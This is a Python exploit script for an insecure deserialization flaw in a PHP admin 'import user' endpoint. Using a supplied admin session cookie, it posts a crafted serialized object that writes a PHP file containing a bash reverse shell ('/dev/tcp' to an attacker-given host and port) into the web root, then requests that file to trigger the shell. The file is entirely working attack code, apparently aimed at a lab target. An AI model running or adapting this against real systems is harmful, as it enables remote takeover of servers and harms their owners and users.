#!/usr/bin/env python3 

import requests 
import argparse
import traceback
from urllib.parse import urljoin

"""
Generate the serialized object using the genMalSerObj.php
"""

def imprtUsrInsecDesRce(target, lhost, lport, adminSession):
    """
    Send the import user request with a malicious serialized object that invokes the method `file_put_contents` to write a reverse shell to the target file system 
    """
    imprtUsrUrl = urljoin(target, "/admin/import_user.php")
    admin_cookies = {"PHPSESSID": adminSession}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    serializedObject = "O:3:\"Log\":2:{s:1:\"f\";s:26:\"/var/www/html/revshell.php\";s:1:\"m\";s:69:\"<?php exec(\"bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'\"); ?>\";}" %(lhost, lport)
    print("[+] Payload: ", serializedObject)
    imprtUsrData = {"userobj": serializedObject}
    try:
        imprtUsrRes = requests.post(imprtUsrUrl, headers=headers, cookies=admin_cookies, data=imprtUsrData, allow_redirects=False)
        print("[+] Malicious serialized object sent successfully")
        """
        Trigger the reverse shell written to the file system
        """
        revShellUrl = urljoin(target, "/revshell.php")
        print(f"[+] Reverse shell triggered. Check your listener {lhost}:{lport}")
        revShellUrlRes = requests.get(revShellUrl)
    except Exception as e:
        print("[-] Error sending the import user request: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Exploit the import user insecure deserialization to invoke `file_put_contents` to wite a reverse shell on the target file system")
    parser.add_argument("target", help="Target's base URL (e.g, http://192.168.174.234:80/)")
    parser.add_argument("lhost", help='Attacker IP address')
    parser.add_argument("lport", help="Listener port")
    parser.add_argument("admin_session_token", help="Admin session token")
    args = parser.parse_args()

    imprtUsrInsecDesRce(args.target, args.lhost, args.lport, args.admin_session_token)

if __name__ == "__main__":
    main()
